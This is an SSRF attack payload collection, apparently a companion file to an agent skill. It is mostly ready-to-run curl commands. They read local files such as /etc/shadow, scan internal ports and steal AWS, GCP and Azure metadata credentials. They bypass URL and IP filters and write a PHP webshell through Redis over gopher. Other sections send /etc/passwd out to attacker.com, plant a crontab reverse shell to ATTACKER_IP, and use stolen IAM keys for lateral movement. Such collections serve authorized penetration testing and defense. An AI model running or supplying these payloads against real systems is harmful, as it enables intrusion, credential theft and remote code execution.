# SSRF Payloads -- Complete Attack Payload Collection

> This file is a companion to `SKILL.md`, containing all SSRF attack payloads organized by category.

---

## 1. SSRF Detection (Basic Probes)

Test whether the application accepts internal IP addresses as URL parameters.

```bash
# Local loopback addresses - basic detection
curl "http://target/fetch?url=http://127.0.0.1:8080/admin"
curl "http://target/fetch?url=http://localhost/server-status"
curl "http://target/fetch?url=http://localhost:80/"
curl "http://target/fetch?url=http://[::1]:80/"
curl "http://target/fetch?url=http://0.0.0.0:80/"

# Local file read - file protocol
curl "http://target/fetch?url=file:///etc/passwd"
curl "http://target/fetch?url=file:///proc/self/environ"
curl "http://target/fetch?url=file:///etc/hosts"
curl "http://target/fetch?url=file:///proc/self/cmdline"
```

---

## 2. Protocol Scheme Abuse

Exploit non-HTTP protocols to access internal services or read local files.

### file:// Protocol - Local File Read

```bash
curl "http://target/fetch?url=file:///etc/passwd"
curl "http://target/fetch?url=file:///etc/shadow"
curl "http://target/fetch?url=file:///var/log/apache2/access.log"
curl "http://target/fetch?url=file:///proc/self/environ"
curl "http://target/fetch?url=file:///proc/net/tcp"
curl "http://target/fetch?url=file:///proc/net/arp"
```

### gopher:// Protocol - Arbitrary TCP Data Transmission

```bash
# Redis - INFO command
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_INFO"

# Redis - Write webshell (full chain)
# Use Gopherus to generate payload:
python3 gopherus.py --exploit redis
# Manual construction:
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html"
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php"
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SET%20payload%20%3C%3Fphp%20system(%24_GET%5Bcmd%5D)%3B%3F%3E"
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SAVE"

# MySQL - Construct protocol packets
python3 gopherus.py --exploit mysql

# FastCGI - Execute arbitrary code
python3 gopherus.py --exploit fastcgi

# SMTP - Send email
curl "http://target/fetch?url=gopher://127.0.0.1:25/_HELO%20attacker.com%250AMAIL%20FROM%3Aattacker%40example.com%250ARCPT%20TO%3Avictim%40example.com%250ADATA%250ASubject%3A%20SSRF%250ATest%250A.%250AQUIT"
```

### dict:// Protocol - Dictionary Protocol Commands

```bash
curl "http://target/fetch?url=dict://127.0.0.1:6379/INFO"
curl "http://target/fetch?url=dict://127.0.0.1:6379/CONFIG%20GET%20dir"
curl "http://target/fetch?url=dict://127.0.0.1:11211/stats"
curl "http://target/fetch?url=dict://127.0.0.1:11211/stats%20slabs"
```

### ldap:// Protocol - LDAP Queries

```bash
curl "http://target/fetch?url=ldap://127.0.0.1:389/"
curl "http://target/fetch?url=ldap://127.0.0.1:389/dc=example,dc=com"
```

---

## 3. Internal Service Scanning

Probe internal network ports and services through SSRF.

```bash
# Scan common internal network ranges
# 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16

# Manual probing of common ports
curl "http://target/fetch?url=http://192.168.1.1:22/"
curl "http://target/fetch?url=http://192.168.1.1:3306/"
curl "http://target/fetch?url=http://192.168.1.1:5432/"
curl "http://target/fetch?url=http://192.168.1.1:6379/"
curl "http://target/fetch?url=http://192.168.1.1:8080/"
curl "http://target/fetch?url=http://192.168.1.1:9200/"
curl "http://target/fetch?url=http://192.168.1.1:27017/"

# Batch scanning with ffuf
ffuf -u "http://target/fetch?url=http://192.168.1.FUZZ:8080/" \
  -w num.txt -mc all -fc 500 -t 50

# Port scanning with ffuf
ffuf -u "http://target/fetch?url=http://192.168.1.1:FUZZ/" \
  -w ports.txt -mc all -fc 500 -t 50

# Blind SSRF - Determine open ports by response time
# Open ports typically respond faster or return different status codes
time curl "http://target/fetch?url=http://192.168.1.1:6379/"
time curl "http://target/fetch?url=http://192.168.1.1:9999/"
```

---

## 4. Cloud Metadata (AWS / GCP / Azure)

Access cloud instance metadata endpoints through SSRF to obtain credentials and configurations.

### AWS EC2 Metadata

```bash
# IMDSv1 (enabled by default, no extra headers required)
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/"
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
curl "http://target/fetch?url=http://169.254.169.254/latest/user-data/"
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/hostname"
curl "http://target/fetch?url=http://169.254.169.254/latest/meta-data/local-ipv4"
curl "http://target/fetch?url=http://169.254.169.254/latest/dynamic/instance-identity/document"

# IMDSv2 (requires PUT request to obtain token, SSRF usually cannot exploit directly)
# But if the application supports custom HTTP methods or header injection:
# 1. PUT http://169.254.169.254/latest/api/token -> obtain token
# 2. GET http://169.254.169.254/latest/meta-data/ + X-aws-ec2-metadata-token: <token>
```

### GCP Metadata

```bash
# GCP requires Metadata-Flavor: Google header
# But some SSRF scenarios allow direct access
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/"
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"
curl "http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"

# Access via IP address
curl "http://target/fetch?url=http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"
```

### Azure Metadata

```bash
# Azure requires Metadata: true header
curl "http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
curl "http://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01"
curl "http://target/fetch?url=http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/"
```

### Cloud Metadata IP Obfuscation Bypass

```bash
# Hexadecimal
curl "http://target/fetch?url=http://0xa9.0xfe.0xa9.0xfe/"

# Decimal
curl "http://target/fetch?url=http://2852039166/"

# Octal
curl "http://target/fetch?url=http://0251.0376.0251.0376/"

# IPv6 mapped (supported in some environments)
curl "http://target/fetch?url=http://[0:0:0:0:0:ffff:a9fe:a9fe]/"
```

---

## 5. URL Parser Bypass

Exploit URL parser differences to bypass domain/IP filtering.

### @ Symbol Spoofing

```bash
# Authentication portion is ignored, actual request goes to the address after @
curl "http://target/fetch?url=http://allowed-domain.com@127.0.0.1:8080/admin"
curl "http://target/fetch?url=http://allowed-domain.com@169.254.169.254/latest/meta-data/"
curl "http://target/fetch?url=http://user:pass@127.0.0.1:8080/admin"
```

### # Fragment Spoofing

```bash
# The part after # is not sent as part of the request
curl "http://target/fetch?url=http://169.254.169.254%23.allowed.com/"
```

### URL Encoding Bypass

```bash
curl "http://target/fetch?url=http://%31%36%39%2e%32%35%34%2e%31%36%39%2e%32%35%34/"
curl "http://target/fetch?url=http://%31%32%37%2e%30%2e%30%2e%31/"
```

### Open Redirect Exploitation

```bash
# Leverage the target's own legitimate 302 redirect to internal addresses
curl "http://target/fetch?url=http://target.com/redirect?next=http://169.254.169.254/"
curl "http://target/fetch?url=http://target.com/redirect?url=http://127.0.0.1:8080/admin"
# Leverage external trusted domain's open redirect
curl "http://target/fetch?url=http://trusted-site.com/redirect?to=http://127.0.0.1/"
```

### URL Parsing Differences

```bash
# Short-form localhost
curl "http://target/fetch?url=http://127.1:8080/"

# Backslash instead of forward slash (accepted by some parsers)
curl "http://target/fetch?url=http://127.0.0.1:8080\\@allowed.com/"

# Nested encoding
curl "http://target/fetch?url=http://127.0.0.1:8080/%2561dmin"
```

---

## 6. IP Representation Bypass

Use different IP representations to bypass IP-based filtering rules.

### Hexadecimal

```bash
curl "http://target/fetch?url=http://0x7f000001:8080/"         # 127.0.0.1
curl "http://target/fetch?url=http://0xa9fea9fe/"               # 169.254.169.254
curl "http://target/fetch?url=http://0x0a000001/"               # 10.0.0.1
curl "http://target/fetch?url=http://0x7f.0x00.0x00.0x01:8080/" # 127.0.0.1 (segmented hex)
```

### Decimal

```bash
curl "http://target/fetch?url=http://2130706433:8080/"          # 127.0.0.1
curl "http://target/fetch?url=http://2852039166/"               # 169.254.169.254
curl "http://target/fetch?url=http://167772161/"                # 10.0.0.1
```

### Octal

```bash
curl "http://target/fetch?url=http://0177.0.0.1:8080/"          # 127.0.0.1
curl "http://target/fetch?url=http://0251.0376.0251.0376/"      # 169.254.169.254
curl "http://target/fetch?url=http://012.0.0.1/"                # 10.0.0.1
```

### IPv6 Loopback

```bash
curl "http://target/fetch?url=http://[::1]:8080/"               # IPv6 localhost
curl "http://target/fetch?url=http://[::ffff:127.0.0.1]:8080/"  # IPv6 mapped
curl "http://target/fetch?url=http://[0:0:0:0:0:ffff:7f00:1]:8080/"
```

### All-Zeros Address

```bash
curl "http://target/fetch?url=http://0.0.0.0:8080/"             # All zeros (resolves to localhost on some systems)
```

### Mixed Representation

```bash
curl "http://target/fetch?url=http://0x7f.0.0.1:8080/"          # Mixed hex and decimal
curl "http://target/fetch?url=http://0177.0.0.0x1:8080/"        # Mixed octal and hex
```

---

## 7. DNS Rebinding

The first DNS resolution returns a public IP (passes validation), the second resolution returns an internal IP (actual request target).

```bash
# Use online DNS rebinding tools
# https://lock.cmpxchg8b.com/rebinder.html
# https://1u.ms/
# https://ssrf.tp0.fr/

# Principle:
# 1. Configure domain A record with TTL=0
# 2. DNS server alternates: public IP <-> internal IP
# 3. Application's first DNS query gets public IP -> validation passes
# 4. Application's second DNS query (actual request) gets internal IP -> bypass

# Using example domain (configure your own)
curl "http://target/fetch?url=http://rebind.attacker.com/latest/meta-data/iam/security-credentials/"

# Using 1u.ms service
curl "http://target/fetch?url=http://make-127.0.0.1-rebind.1u.ms/"
```

---

## 8. Blind SSRF (OOB Callback)

The application does not return SSRF response content; detect the vulnerability through external callbacks.

```bash
# Burp Suite Collaborator
# Inject Collaborator address and observe DNS/HTTP callbacks
curl "http://target/fetch?url=http://BURP_COLLABORATOR_DOMAIN/"

# Using interactsh (ProjectDiscovery)
# Start interactsh-client
interactsh-client
# Inject the generated callback address
curl "http://target/fetch?url=http://GENERATED_INTERACTSH_DOMAIN/"

# Using public callback services
curl "http://target/fetch?url=http://webhook.site/YOUR_UNIQUE_ID/"
curl "http://target/fetch?url=http://pingb.in/YOUR_UNIQUE_ID/"

# Blind SSRF + data exfiltration
# Exfiltrate data via DNS queries
curl "http://target/fetch?url=http://$(cat /etc/hostname).attacker.com/"
# Exfiltrate data via HTTP callback
curl "http://target/fetch?url=http://attacker.com/collect?data=$(cat /etc/passwd | base64)"
```

---

## 9. SSRF to Remote Code Execution

Escalate SSRF to remote code execution through chained attacks.

### SSRF + Redis Unauthorized Webshell Write

```bash
# Use Gopherus to generate complete payload
python3 gopherus.py --exploit redis

# Manual steps:
# 1. Set write directory
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html"
# 2. Set filename
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dbfilename%20shell.php"
# 3. Write payload
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SET%20x%20%22%3C%3Fphp%20system(%24_GET%5Bcmd%5D)%3B%3F%3E%22"
# 4. Save
curl "http://target/fetch?url=gopher://127.0.0.1:6379/_SAVE"
# 5. Access webshell
curl "http://target/shell.php?cmd=id"
```

### SSRF + Redis Write Crontab Reverse Shell

```bash
# Set crontab directory
# Use Gopherus to generate payload
python3 gopherus.py --exploit redis --crontab

# Manual steps:
# 1. CONFIG SET dir /var/spool/cron
# 2. CONFIG SET dbfilename root
# 3. SET x "\n\n*/1 * * * * bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1\n\n"
# 4. SAVE
```

### SSRF + Redis Write SSH Public Key

```bash
# 1. CONFIG SET dir /root/.ssh
# 2. CONFIG SET dbfilename authorized_keys
# 3. SET x "\n\nssh-rsa AAAA... attacker@kali\n\n"
# 4. SAVE
```

### SSRF + MySQL Execute SQL

```bash
# Use Gopherus to generate MySQL protocol payload
python3 gopherus.py --exploit mysql
# Requires MySQL with no password or known password
```

### SSRF + FastCGI Execute Arbitrary Code

```bash
# Use Gopherus to generate FastCGI payload
python3 gopherus.py --exploit fastcgi
# Exploit PHP-FPM to execute arbitrary code
```

### SSRF + AWS IAM Lateral Movement

```bash
# 1. Obtain IAM temporary credentials via SSRF
# http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# 2. Configure AWS CLI
aws configure set aws_access_key_id ASIA...
aws configure set aws_secret_access_key wJalrXU...
aws configure set aws_session_token FwoGZXI...
# 3. Enumerate and exploit cloud resources
aws s3 ls
aws ec2 describe-instances
aws lambda list-functions
```
